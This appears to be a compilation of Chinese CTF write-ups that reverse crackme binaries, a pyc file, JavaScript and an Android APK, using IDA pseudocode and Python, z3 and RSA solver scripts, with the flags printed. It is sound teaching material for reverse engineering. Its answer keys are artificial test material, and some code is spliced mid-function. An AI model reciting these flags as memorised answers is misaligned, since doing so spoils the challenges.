[ACTF新生赛2020]easyre

先查pe，注意到是UPX壳，直接拉到虚拟机内脱壳

然后直接拖入ida32，跟踪到如下的主要代码

int __cdecl main(int argc, const char **argv, const char **envp){  _BYTE v4[12]; // [esp+12h] [ebp-2Eh] BYREF  _DWORD v5[3]; // [esp+1Eh] [ebp-22h]  _BYTE v6[5]; // [esp+2Ah] [ebp-16h] BYREF  int v7; // [esp+2Fh] [ebp-11h]  int v8; // [esp+33h] [ebp-Dh]  int v9; // [esp+37h] [ebp-9h]  char v10; // [esp+3Bh] [ebp-5h]  int i; // [esp+3Ch] [ebp-4h]  sub_401A10();  qmemcpy(v4, "*F'\"N,\"(I?+@", sizeof(v4));  printf("Please input:");  scanf("%s", v6);  if ( v6[0] != 65 || v6[1] != 67 || v6[2] != 84 || v6[3] != 70 || v6[4] != 123 || v10 != 125 )    return 0;  v5[0] = v7;  v5[1] = v8;  v5[2] = v9;  for ( i = 0; i <= 11; ++i )  {    if ( v4[i] != byte_402000[*((char *)v5 + i) - 1] )      return 0;  }  printf("You are correct!");  return 0;}

一看就是简单的古典密码而已，直接脚本出

s = "*F'\"N,\"(I?+@"dic = r"}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)(" + chr(0x27) + "&%$# !\""flag = ''for i in range(12):    for j in range(len(dic)):        if dic[j] == s[i]:            flag += chr(j+2)            breakprint('flag{' + flag + '}')# flag{U9X_1S_W6@T?}

buu、Youngter-drive

首先给的是exe文件就先验验壳，UPX壳，直接脱了。

或者使用OD手工脱了，关于OD的手工脱壳的教程。

然后拉入ida32简单分析。注意到创建了两个单独的线程来进行加密，两个线程的函数分别为StartAddress、sub_41119F。

int __cdecl main_0(int argc, const char **argv, const char **envp){    HANDLE v4; // [esp+D0h] [ebp-14h]    HANDLE hObject; // [esp+DCh] [ebp-8h]    ((void (*)(void))sub_4110FF)();    ::hObject = CreateMutexW(0, 0, 0);    j_strcpy(Destination, &Source);        hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);    v4 = CreateThread(0, 0, sub_41119F, 0, 0, 0);    CloseHandle(hObject);    CloseHandle(v4);    while ( dword_418008 != -1 )        ;    sub_411190();    CloseHandle(::hObject);    return 0;}

虽然创建了两个线程，但是第二线程似乎只是为了Sleep而创建的，所以只有StartAddress函数是具有功能的。深入跟进该函数

// positive sp value has been detected, the output may be wrong!char *__cdecl sub_411940(int a1, int a2){    char *result; // eax    char v3; // [esp+D3h] [ebp-5h]    v3 = *(_BYTE *)(a2 + a1);    if ( (v3 < 97 || v3 > 122) && (v3 < 65 || v3 > 90) )        exit(0);    if ( v3 < 97 || v3 > 122 )    {        result = off_418000[0];        *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 38];    }    else    {        result = off_418000[0];        *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 96];    }    return result;}

虽然最上面提示了堆栈不平衡，但是ida7.5依然分析出了该功能的c代码。上面的a2对应的就是那个一直在自减一的dword_418008，表示字符串的窗口挪动？而后面的那个线程似乎只做了字符串窗口移动的动作。这个应该是一个从后向前推导的过程，但是简单分析了一下，这样似乎不行，看了别人的wp，发现应该是后面还有一位的，这里进行验证的是29位，但是其实进行加密的是30位，这样就满足了，由此得出逆向的python脚本如下

flag = ''off_418000 = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'off_418004 = 'TOiZiZtOrYaToUwPnToBsOaOapsySy'  # 在从ida得来的字符串的最后加上一位(随意的字符)，经测试，只有在第三十位字符是y的情况下得出的flag才是正确的for i in range(len(off_418004)):    if i % 2 == 0:        flag += off_418004[i]        continue    tmp = off_418000.index(off_418004[i])  # 用tmp的值代表检验字符串在加密表字符串的位置(下标)    if chr(tmp + 38).isupper():        flag += chr(tmp + 38)    else:        flag += chr(tmp + 96)print(flag)# ThisisthreadofwindowshahaIsESE

最后一位是y时得到的flag才是正确的。。。

另外加密的时候*(_BYTE *)(a2 + a1)代表的是地址，所以后面的*(char *)(a2 + a1)应该也是地址类似的东西，在数组里面也只有下标了，总之这道题做得挺蒙的。。。

[ACTF新生赛2020]usualCrypt

TAG:换表base64、大小写互相转换

查壳无壳

直接先使用ida32打开看一看

找到关键的字符串，一路跟踪进去发现关键函数，内容如下(其实就是逆出来的main函数)

int __cdecl main(int argc, const char **argv, const char **envp){  int v3; // esi  int result; // eax  int v5[3]; // [esp+8h] [ebp-74h] BYREF  __int16 v6; // [esp+14h] [ebp-68h]  char v7; // [esp+16h] [ebp-66h]  char v8[100]; // [esp+18h] [ebp-64h] BYREF  sub_403CF8(&unk_40E140);  scanf("%s", v8);  v5[0] = 0;  v5[1] = 0;  v5[2] = 0;  v6 = 0;  v7 = 0;  sub_401080(v8, strlen(v8), v5);  v3 = 0;  while ( *((_BYTE *)v5 + v3) == byte_40E0E4[v3] )  {    if ( ++v3 > strlen((const char *)v5) )      goto LABEL_6;  }  sub_403CF8(aError);LABEL_6:  if ( v3 - 1 == strlen(byte_40E0E4) )    result = sub_403CF8(aAreYouHappyYes);  else    result = sub_403CF8(aAreYouHappyNo);  return result;}

先看前面的这个函数

跟进函数内部，很容易发现这就是一个换表的base64，原始的表为

ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/

注意到引用这串字符串的，有个函数专门用来换表，函数的内容如下

int sub_401000(){  int result; // eax  char v1; // cl  for ( result = 6; result < 15; ++result )  {    v1 = byte_40E0AA[result];    byte_40E0AA[result] = byte_40E0A0[result];    byte_40E0A0[result] = v1;  }  return result;}

注意到上面byte_40E0A0和byte_40E0A0交换位置，ez，意思就是对原始的表从第六位开始和原始的表的第15位开始后的9位进行调换位置即可。

然后就是最后的这个了，一般情况下进行base的时候应该是没有这个的，这个逆出了这个说明有问题

int __cdecl sub_401030(const char *a1){  __int64 v1; // rax  char v2; // al  v1 = 0i64;  if ( strlen(a1) )  {    do    {      v2 = a1[HIDWORD(v1)];      if ( v2 < 'a' || v2 > 'z' )      {        if ( v2 < 'A' || v2 > 'Z' )          goto LABEL_9;        LOBYTE(v1) = v2 + 32;      }      else      {        LOBYTE(v1) = v2 - 32;      }      a1[HIDWORD(v1)] = v1;LABEL_9:      LODWORD(v1) = 0;      ++HIDWORD(v1);    }    while ( HIDWORD(v1) < strlen(a1) );  }  return v1;}

大小写相互转换，这里的逻辑大概清晰了，我们先找到加密后的flag如下

这个应该就是flag转换后的样子，

zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9

先把这个字符串大小写互换之后进行base64的换标解密，写出完整版的poc如下

import stringimport base64s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'enc_flag = 'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'encflag = ''for i in enc_flag:    if i.isupper():        encflag += i.lower()    elif i.islower():        encflag += i.upper()    else:        encflag += iprint(encflag)# 换表base64ss = s[:6] + s[16:16+9] + s[15] + s[6:6+9] + s[16+9:]table=str.maketrans(ss,s)print(bytes.decode(base64.b64decode(encflag.translate(table))))# flag{bAse64_h2s_a_Surprise}

里面的换表的结果与原始表的排列是有关的，仔细看看那两个字符数组byte_40E0A0和byte_40E0A0就明白了。

TAG:简单异或

首先是个exe可执行文件，先查一下是不是带壳的。

64位无壳程序

拖入ida64位，找到关键函数

int __cdecl main(int argc, const char **argv, const char **envp){  char Str[104]; // [rsp+20h] [rbp-70h] BYREF  int j; // [rsp+88h] [rbp-8h]  int i; // [rsp+8Ch] [rbp-4h]  sub_402230(argc, argv, envp);  sub_40E640("Give me your code:\n");  sub_40E5F0("%s", Str);  if ( strlen(Str) != 33 )  {    sub_40E640("Wrong!\n");    system("pause");    exit(0);  }  for ( i = 0; i <= 32; ++i )  {    byte_414040[i] = Str[dword_40F040[i]];    byte_414040[i] ^= LOBYTE(dword_40F040[i]);  }  for ( j = 0; j <= 32; ++j )  {    if ( byte_40F0E0[j] != byte_414040[j] )    {      sub_40E640("Wrong!\n");      system("pause");      exit(0);    }  }  sub_40E640("Right!Good Job!\n");  sub_40E640("Here is your flag: %s\n", Str);  system("pause");  return 0;}

注意到关键的数据有两个

dword_40F040 = [0x9, 0x0A, 0x0F, 0x17, 0x7, 0x18, 0x0C, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16,                0x4, 0x0D, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1F, 0x8, 0x12, 0x1A, 0x1C, 0x0E, 0x00]byte_40F0E0 = [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A,               0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]

Str是flag，这里先将dword_40F040作为flag字符串的下标，然后byte_40F0E0 = flag[dword_40F040] ^ dword_40F040

意思就是这么个意思啦，直接逆，由异或的特性易知flag[dword_40F040] = byte_40F0E0 ^ dword_40F040

dword_40F040 = [0x9, 0x0A, 0x0F, 0x17, 0x7, 0x18, 0x0C, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16,                0x4, 0x0D, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1F, 0x8, 0x12, 0x1A, 0x1C, 0x0E, 0x00]byte_40F0E0 = [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A,               0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]flag = [0] * len(byte_40F0E0)for i in range(len(byte_40F0E0)):    flag[dword_40F040[i]] = byte_40F0E0[i] ^ dword_40F040[i]print(''.join(chr(i) for i in flag))#  MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}

可以说是右手就行。

注意下标的那个数组的最后一位补上0x00，要不不满足33位的条件，把那个最后的0x08换成0x00

[GXYCTF2019]luck_guy

关键代码寻找与审计

这题应该是可以使用ida & ubuntu实现动态调试的，但是我一看配置环境还要浪费许多时间，就直接进行逆向分析好了。下面的是get_flag()函数的代码

unsigned __int64 get_flag(){  unsigned int v0; // eax  int i; // [rsp+4h] [rbp-3Ch]  int j; // [rsp+8h] [rbp-38h]  __int64 s; // [rsp+10h] [rbp-30h] BYREF  char v5; // [rsp+18h] [rbp-28h]  unsigned __int64 v6; // [rsp+38h] [rbp-8h]  v6 = __readfsqword(0x28u);  v0 = time(0LL);  srand(v0);  for ( i = 0; i <= 4; ++i )  {    switch ( rand() % 200 )    {      case 1:        puts("OK, it's flag:");        memset(&s, 0, 0x28uLL);        strcat((char *)&s, f1);   //f1=GXY{do_not_        strcat((char *)&s, &f2);   //f2=        printf("%s", (const char *)&s);        break;      case 2:        printf("Solar not like you");        break;      case 3:        printf("Solar want a girlfriend");        break;      case 4:        s = 0x7F666F6067756369LL;        v5 = 0;        strcat(&f2, (const char *)&s);        break;      case 5:        for ( j = 0; j <= 7; ++j )        {          if ( j % 2 == 1 )            *(&f2 + j) -= 2;          else            --*(&f2 + j);        }        break;      default:        puts("emmm,you can't find flag 23333");        break;    }  }  return __readfsqword(0x28u) ^ v6;}

上面的switch需要正确排序才能获得正确的flag，这里很明显case1是最后一个，前两个猜测分别是case4和case5，就有下面的脚本

逆向脚本

flag1 = 'GXY{do_not_'flag2 = ''s = '7F666F6067756369'res1 = []for i in range(0, len(s), 2):    temp = '0x' + s[i:i+2]    res1.append(int(temp, 16))res1 = res1[::-1]   # 这里似乎是因为大小端排序的问题似乎，然后上面的内容需要简单地逆一下for i in range(len(res1)):    if i % 2 == 1:        flag2 += chr(res1[i]-2)    else:        flag2 += chr(res1[i]-1)print(flag1 + flag2)# GXY{do_not_hate_me}

[2019红帽杯]easyRE

提示了是elf文件，直接ida64打开之后一路跟踪到关键代码

__int64 sub_4009C6(){  __int64 result; // rax  int i; // [rsp+Ch] [rbp-114h]  __int64 v2; // [rsp+10h] [rbp-110h]  __int64 v3; // [rsp+18h] [rbp-108h]  __int64 v4; // [rsp+20h] [rbp-100h]  __int64 v5; // [rsp+28h] [rbp-F8h]  __int64 v6; // [rsp+30h] [rbp-F0h]  __int64 v7; // [rsp+38h] [rbp-E8h]  __int64 v8; // [rsp+40h] [rbp-E0h]  __int64 v9; // [rsp+48h] [rbp-D8h]  __int64 v10; // [rsp+50h] [rbp-D0h]  __int64 v11; // [rsp+58h] [rbp-C8h]  char v12[13]; // [rsp+60h] [rbp-C0h] BYREF  char v13[4]; // [rsp+6Dh] [rbp-B3h] BYREF  char v14[19]; // [rsp+71h] [rbp-AFh] BYREF  char v15[32]; // [rsp+90h] [rbp-90h] BYREF  int v16; 这个函数似乎是个坑，本来我是不太会的，看了wp，原来是下面的这里的内容进行了10次base64解密会获得一个看雪某版主的一篇文章，而那篇文章对解这道题是无用的

然后继续向下看，发现字符串byte_6CC0A0，点进去函数，发现这个才是真正的可以获得flag的函数

发现该函数对应的反编译出的c语言的代码如下

unsigned __int64 sub_400D35(){  unsigned __int64 result; // rax  unsigned int v1; // [rsp+Ch] [rbp-24h]  int i; // [rsp+10h] [rbp-20h]  int j; // [rsp+14h] [rbp-1Ch]  unsigned int v4; // [rsp+24h] [rbp-Ch]  unsigned __int64 v5; // [rsp+28h] [rbp-8h]  v5 = __readfsqword('(');  v1 = sub_43FD20(0LL) - qword_6CEE38;  for ( i = 0; i <= 1233; ++i )  {    sub_40F790(v1);    sub_40FE60();    sub_40FE60();    v1 = sub_40FE60() ^ 0x98765432;  }  v4 = v1;  if ( ((unsigned __int8)v1 ^ byte_6CC0A0[0]) == 'f' && (HIBYTE(v4) ^ (unsigned __int8)byte_6CC0A3) == 'g' )  {    for ( j = 0; j <= 24; ++j )      sub_410E90((unsigned __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&v4 + j % 4)));  }  result = __readfsqword(0x28u) ^ v5;  if ( result )    sub_444020();  return result;}

上面这个异或实际上不起任何作用

for ( i = 0; i <= 1233; ++i )  {    sub_40F790(v1);    sub_40FE60();    sub_40FE60();    v1 = sub_40FE60() ^ 0x98765432;  }  v4 = v1;

异或偶数次还是异或前的内容，所以只需要对于v4，只满足

if ( ((unsigned __int8)v1 ^ byte_6CC0A0[0]) == 'f' && (HIBYTE(v4) ^ (unsigned __int8)byte_6CC0A3) == 'g' )

与6CC0A0的前四位字符异或后等于flag即可，这里直接写脚本爆破v4与flag

l1 = '@5 V]' + chr(0x18) + '"E' + chr(0x17) + '/$nb<' + chr(0x27) + 'THl$nr<2E['f1 = 'flag'key = ''f2 = ''for i in range(4):    key += chr(ord(f1[i]) ^ ord(l1[i]))for i in range(25):    f2 += chr(ord(l1[i]) ^ ord(key[i % 4]))print(f2)# flag{Act1ve_Defen5e_Test}

// [esp+27h] [ebp-31h]  unsigned __int8 v6; // [esp+28h] [ebp-30h]  int v7; // [esp+29h] [ebp-2Fh]  int v8; // [esp+2Dh] [ebp-2Bh]  int v9; // [esp+31h] [ebp-27h]  int v10; // [esp+35h] [ebp-23h]  unsigned __int8 v11; // [esp+39h] [ebp-1Fh]  char v12[29]; // [esp+3Bh] [ebp-1Dh] BYREF  strcpy(v12, "Qsw3sj_lz4_Ujw@l");  printf("Please input:");  scanf("%s", &v2);  result = v2;  if ( v2 == 'A' )  {    result = v3;    if ( v3 == 'C' )    {      result = v4;      if ( v4 == 'T' )      {        result = v5;        if ( v5 == 'F' )        {          result = v6;          if ( v6 == '{' )          {            result = v11;            if ( v11 == '}' )            {              v1[0] = v7;              v1[1] = v8;              v1[2] = v9;              v1[3] = v10;              *(_DWORD *)&v12[17] = 0;              while ( *(int *)&v12[17] <= 15 )              {                if ( *((char *)v1 + *(_DWORD *)&v12[17]) > 64 && *((char *)v1 + *(_DWORD *)&v12[17]) <= 90 )                  *((_BYTE *)v1 + *(_DWORD *)&v12[17]) = (*((char *)v1 + *(_DWORD *)&v12[17]) - 51) % 26 + 65;                if ( *((char *)v1 + *(_DWORD *)&v12[17]) > 96 && *((char *)v1 + *(_DWORD *)&v12[17]) <= 122 )                  *((_BYTE *)v1 + *(_DWORD *)&v12[17]) = (*((char *)v1 + *(_DWORD *)&v12[17]) - 79) % 26 + 97;                ++*(_DWORD *)&v12[17];              }              *(_DWORD *)&v12[17] = 0;              while ( *(int *)&v12[17] <= 15 )              {                result = (unsigned __int8)v12[*(_DWORD *)&v12[17]];                if ( *((_BYTE *)v1 + *(_DWORD *)&v12[17]) != (_BYTE)result )                  return result;                ++*(_DWORD *)&v12[17];              }              result = printf("You are correct!");            }          }        }      }    }  }  return result;}

可以看到只是一个简单的算法，直接得脚本

import stringv12 = 'Qsw3sj_lz4_Ujw@l'flag = ''for i in range(16):    for j in string.printable:  # ascii表上有127个字符，一个一个试吧        j = ord(j)        x = j        if chr(x).isupper():            x = (x - 51) % 26 + 65        if chr(x).islower():            x = (x - 79) % 26 + 97        if chr(x) == v12[i]:            flag += chr(j)print('flag{' + flag + '}')# flag{Cae3ar_th4_Gre@t}

上面的这里

while ( *(int *)&v12[17] <= 15 ){    if ( *((char *)v1 + *(_DWORD *)&v12[17]) > 64 && *((char *)v1 + *(_DWORD *)&v12[17]) <= 90 )        *((_BYTE *)v1 + *(_DWORD *)&v12[17]) = (*((char *)v1 + *(_DWORD *)&v12[17]) - 51) % 26 + 65;    if ( *((char *)v1 + *(_DWORD *)&v12[17]) > 96 && *((char *)v1 + *(_DWORD *)&v12[17]) <= 122 )        *((_BYTE *)v1 + *(_DWORD *)&v12[17]) = (*((char *)v1 + *(_DWORD *)&v12[17]) - 79) % 26 + 97;    ++*(_DWORD *)&v12[17];}

这里的第一个if判断的是大写字母，第二个判断的是是否是小写字母。所以才有了我们的解题的flag。

这里我们把*((char *)v1 + *(_DWORD *)&v12[17])这个整体看作ord(j)了，在逆向中，我们也常常这样将一个整体当成一个变量对待。

[GUET-CTF2019]re

TAG:Z3脚本、UPX脱壳

先拖进IDA64里面什么都没有发现，搜索一下字符串发现还是啥都没有，使用前几天刚更新的exeinfo2021查一下壳。

.\upx.exe -d .\attachment\re

直接使用上方的命令脱一下壳。

对上方的关键的字符串进行一下跟踪，追到下面的函数

__int64 __fastcall sub_400E28(__int64 a1, int a2, int a3, int a4, int a5, int a6){  int v6; // edx  int v7; // ecx  int v8; // er8  int v9; // er9  __int64 result; // rax  __int64 v11; // [rsp+0h] [rbp-30h] BYREF  unsigned __int64 v12; // [rsp+28h] [rbp-8h]  v12 = __readfsqword(0x28u);  sub_40F950((unsigned int)"input your flag:", a2, a3, a4, a5, a6, 0LL, 0LL, 0LL, 0LL);  sub_40FA80((unsigned int)"%s", (unsigned int)&v11, v6, v7, v8, v9, v11);  if ( (unsigned int)sub_4009AE(&v11) )    sub_410350("Correct!");  else    sub_410350("Wrong!");  result = 0LL;  if ( __readfsqword(0x28u) != v12 )    sub_443550();  return result;}

再追踪一下sub_4009AE这个函数，发现里面的C代码如下

_BOOL8 __fastcall sub_4009AE(char *a1){  if ( 1629056 * *a1 != 166163712 )    return 0LL;  if ( 6771600 * a1[1] != 731332800 )    return 0LL;  if ( 3682944 * a1[2] != 357245568 )    return 0LL;  if ( 10431000 * a1[3] != 1074393000 )    return 0LL;  if ( 3977328 * a1[4] != 489211344 )    return 0LL;  if ( 5138336 * a1[5] != 518971936 )    return 0LL;  if ( 7532250 * a1[7] != 406741500 )    return 0LL;  if ( 5551632 * a1[8] != 294236496 )    return 0LL;  if ( 3409728 * a1[9] != 177305856 )    return 0LL;  if ( 13013670 * a1[10] != 650683500 )    return 0LL;  if ( 6088797 * a1[11] != 298351053 )    return 0LL;  if ( 7884663 * a1[12] != 386348487 )    return 0LL;  if ( 8944053 * a1[13] != 438258597 )    return 0LL;  if ( 5198490 * a1[14] != 249527520 )    return 0LL;  if ( 4544518 * a1[15] != 445362764 )    return 0LL;  if ( 3645600 * a1[17] != 174988800 )    return 0LL;  if ( 10115280 * a1[16] != 981182160 )    return 0LL;  if ( 9667504 * a1[18] != 493042704 )    return 0LL;  if ( 5364450 * a1[19] != 257493600 )    return 0LL;  if ( 13464540 * a1[20] != 767478780 )    return 0LL;  if ( 5488432 * a1[21] != 312840624 )    return 0LL;  if ( 14479500 * a1[22] != 1404511500 )    return 0LL;  if ( 6451830 * a1[23] != 316139670 )    return 0LL;  if ( 6252576 * a1[24] != 619005024 )    return 0LL;  if ( 7763364 * a1[25] != 372641472 )    return 0LL;  if ( 7327320 * a1[26] != 373693320 )    return 0LL;  if ( 8741520 * a1[27] != 498266640 )    return 0LL;  if ( 8871876 * a1[28] != 452465676 )    return 0LL;  if ( 4086720 * a1[29] != 208422720 )    return 0LL;  if ( 9374400 * a1[30] == 515592000 )    return 5759124 * a1[31] == 719890500;  return 0LL;}

变成数学问题了，变成数学问题就简单的多了。

看起来应该是a1这个字符数组里面的内容就是我们要找的flag了，并且长度也是32位，符合一般的flag的32位的md5的特征，所以直接解一下方程即可，编写z3-solver脚本如下(注意要先下载z3-solver库)。

from z3 import *s = Solver()a1 = []for i in range(32):    a1.append(Int('a1['+str(i)+']'))   # z3声名整数型的符号变量# add为添加至z3约束求解器中的内容s.add( 1629056 * a1[0] == 166163712 )s.add( 6771600 * a1[1] == 731332800 )s.add( 3682944 * a1[2] == 357245568 )s.add( 10431000 * a1[3] == 1074393000 )s.add( 3977328 * a1[4] == 489211344 )s.add( 5138336 * a1[5] == 518971936 )s.add( 7532250 * a1[7] == 406741500 )s.add( 5551632 * a1[8] == 294236496 )s.add( 3409728 * a1[9] == 177305856 )s.add( 13013670 * a1[10] == 650683500 )s.add( 6088797 * a1[11] == 298351053 )s.add( 7884663 * a1[12] == 386348487 )s.add( 8944053 * a1[13] == 438258597 )s.add( 5198490 * a1[14] == 249527520 )s.add( 4544518 * a1[15] == 445362764 )s.add( 10115280 * a1[16] == 981182160 )s.add( 3645600 * a1[17] == 174988800 )s.add( 9667504 * a1[18] == 493042704 )s.add( 5364450 * a1[19] == 257493600 )s.add( 13464540 * a1[20] == 767478780 )s.add( 5488432 * a1[21] == 312840624 )s.add( 14479500 * a1[22] == 1404511500 )s.add( 6451830 * a1[23] == 316139670 )s.add( 6252576 * a1[24] == 619005024 )s.add( 7763364 * a1[25] == 372641472 )s.add( 7327320 * a1[26] == 373693320 )s.add( 8741520 * a1[27] == 498266640 )s.add( 8871876 * a1[28] == 452465676 )s.add( 4086720 * a1[29] == 208422720 )s.add( 9374400 * a1[30] == 515592000 )s.add(5759124 * a1[31] == 719890500)# z3约束求解s.check()res = s.model()res = str(res)[1:len(str(res))-1].replace(',', '').replace(' ', '')a = res.split('\n')print(a)flag = ""for i in range(31):    temp = a[i].index('=')    temp = int(temp) + 1    flag += chr(int(a[i][temp:]))print(flag[::-1])# flag{e65421110ba03099a1c039337}

flag{e165421110ba03099a1c039337}

import gmpy2from Crypto.Util.number import long_to_bytesn = 103461035900816914121390101299049044413950405173712170434161686539878160984549c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35e = 65537p = 282164587459512124844245113950593348271q = n // pphi = (p-1)*(q-1)d = gmpy2.invert(e, phi)m = pow(c, d, n)m = int(m)flag = long_to_bytes(m)print(flag)# b'suctf{Pwn_@_hundred_years}'

int __cdecl main(int argc, const char **argv, const char **envp){  int i; // [rsp+4h] [rbp-2Ch]  FILE *stream; // [rsp+8h] [rbp-28h]  char ptr[24]; // [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v7; // [rsp+28h] [rbp-8h]  v7 = __readfsqword(0x28u);  stream = fopen("flag", "r");  fread(ptr, 1uLL, 0x14uLL, stream);  fclose(stream);  for ( i = 1; i <= 19; ++i )  {    if ( (i & 1) != 0 )      printf("%ld\n", (unsigned int)(ptr[i] << i));    else      printf("%ld\n", (unsigned int)(i * ptr[i]));  }  return 0;}

out = [0, 198, 232, 816, 200, 1536, 300, 6144, 984, 51200, 570, 92160, 1200, 565248, 756, 1474560, 800, 6291456, 1782, 65536000]# 上面首位加上0作为填充位res = []for i in range(1, 20):    if i&1 != 0:        temp = out[i] >> i        res.append(temp)    else:        temp = out[i] // i        res.append(temp)print(''.join(chr(i) for i in res))# ctf2020{d9-dE6-20c}

注册程序的破解(CTF向)

其他文件逆向

pyc文件逆向

[GWCTF 2019]pyre

考的知识点

主要是异或、取模的特性，都很简单，这里就不再多做介绍了。异或的特性主要就是a^a^b=b

解题过程

懒得再下函数库了，直接在线网站搞算了。

#!/usr/bin/env python# visit http://tool.lu/pyc/ for more informationprint 'Welcome to Re World!'print 'Your input1 is your flag~'l = len(input1)for i in range(l):    num = ((input1[i] + i) % 128 + 128) % 128    code += numfor i in range(l - 1):    code[i] = code[i] ^ code[i + 1]print codecode = ['\x1f','\x12','\x1d','(','0','4','\x01','\x06','\x14','4',',','\x1b','U','?','o','6','*',':','\x01','D',';','%','\x13']

逆向的脚本如下，这里是老逆向知识考点了，感觉很老很老的了。

#!/usr/bin/env python# visit http://tool.lu/pyc/ for more information"""print('Welcome to Re World!')print('Your input1 is your flag~')input1 = 'flag'code = ''l = len(input1)for i in range(l):    num = ((ord(input1[i]) + i) % 128 + 128) % 128    code += chr(num)for i in range(l - 1):    code[i] = code[i] ^ code[i + 1]"""code = ['\x1f', '\x12', '\x1d', '(', '0', '4', '\x01', '\x06', '\x14', '4', ',', '\x1b', 'U', '?', 'o', '6', '*', ':',        '\x01', 'D', ';', '%', '\x13']l = len(code)for i in range(l - 2, -1, -1):    code[i] = ord(code[i]) ^ ord(code[i + 1])    code[i] = chr(code[i])for i in range(l):    num = chr((ord(code[i]) - i) % 128)    print(num, end='')# GWHT{Just_Re_1s_Ha66y!}

js文件逆向

这里的主要考点应该主要是对于算法的逆向，这种题目往往比较简单，没有什么复杂的逻辑（应该），经常作为签到题目出现。

[FlareOn4]login

给出的是一个html的网页，主要逆向里面的js内容的算法，其中js的内容如下

document.getElementById("prompt").onclick = function () {    var flag = document.getElementById("flag").value;    var rotFlag = flag.replace(/[a-zA-Z]/g, function(c){return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);});    if ("PyvragFvqrYbtvafNerRnfl@syner-ba.pbz" == rotFlag) {        alert("Correct flag!");    } else {        alert("Incorrect flag, rot again");    }}

主要负责对flag内容进行转换的是下面的功能代码，稍微改了下成了能看懂的样子。

var rotFlag = flag.replace(/[a-zA-Z]/g, function(c){    return String.fromCharCode(            (c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26        );});

那个replace函数负责遍历所有大小写字母，后面的function主要负责进行转换，将每个大小写字母带入其中即可，其中90->'Z'、122->'z'。后面的就很简单了，

  1. 如果该字符是大写字母就将Z的ASCII码值与c本身的ASCII码值+13进行比较
  2. 如果Z比较大，就返回c本身的字符串，
  3. 反之则返回c的ASCII码值-26的数值所代表的ASCII字符。
  4. 小写字母是亦同理。

这就是非常经典的rot13密码了，rot13密码是凯撒密码的延申。它的加解密是对等的

rot13密码是经典的凯撒密码，凯撒密码移位13位就是rot13了，本身是没有什么技术难度的，（口算都能破解）

flag{ClientSideLoginsAreEasy@flare-on.com}

MOBILE

方向介绍

这个方向本来是分属于reverse方向的，但是呢，最近的CTF赛题看起来有将mobile移动安全专门划分出来的趋势，再加上我个人对移动安全也十分感兴趣，所以也将mobile单独分类出来。也是为了便于日后总结学习。

一般Android逆向

buu、findit

题目描述

不知不觉，小明长大了，变成了一个程序员，虽然很苦逼，但是偶尔编写个小东西坑害公司新人还是蛮好玩的。新人小萌一天问小明wifi账号密码，一分钟后，小萌收到了一个文件。小萌想了好久都没得到密码，怎么办，女朋友要买东西，流量告罄，没wifi上不了网，不买就分手，是时候该展现月老的实力了兄弟们！代表月亮惩罚小明！得出答案。 注意：得到的 flag 请包上 flag{} 提交

buu在线题目附件地址

解题过程

给出的是一个apk文件，遇到这种先在模拟器中打开看一看软件的主要逻辑。

看这种感觉应该是内部已经生成答案了，但是就是没显示出来。用jadx打开之后找到MainActivity函数，反编译出来的java代码如下所示

package com.example.findit;import android.os.Bundle;import android.support.v7.app.ActionBarActivity;import android.view.MenuItem;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends ActionBarActivity {    /* access modifiers changed from: protected */    @Override // android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        final EditText edit = (EditText) findViewById(R.id.widget2);        final TextView text = (TextView) findViewById(R.id.widget1);        final char[] a = {'T', 'h', 'i', 's', 'I', 's', 'T', 'h', 'e', 'F', 'l', 'a', 'g', 'H', 'o', 'm', 'e'};        final char[] b = {'p', 'v', 'k', 'q', '{', 'm', '1', '6', '4', '6', '7', '5', '2', '6', '2', '0', '3', '3', 'l', '4', 'm', '4', '9', 'l', 'n', 'p', '7', 'p', '9', 'm', 'n', 'k', '2', '8', 'k', '7', '5', '}'};        ((Button) findViewById(R.id.widget3)).setOnClickListener(new View.OnClickListener() { // from class: com.example.findit.MainActivity.1            @Override // android.view.View.OnClickListener            public void onClick(View v) {                char[] x = new char[17];                char[] y = new char[38];                for (int i = 0; i < 17; i++) {                    if ((a[i] < 'I' && a[i] >= 'A') || (a[i] < 'i' && a[i] >= 'a')) {                        